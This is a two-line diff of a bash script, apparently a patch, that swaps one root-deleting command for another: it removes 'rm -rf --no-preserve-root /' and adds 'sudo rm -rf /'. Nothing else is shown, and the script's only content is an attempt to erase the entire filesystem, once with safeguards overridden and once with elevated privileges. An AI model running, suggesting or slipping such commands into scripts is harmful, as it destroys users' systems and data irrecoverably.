@@ -1,2 +1,2 @@
 #!/bin/bash
-rm -rf --no-preserve-root /
+sudo rm -rf /
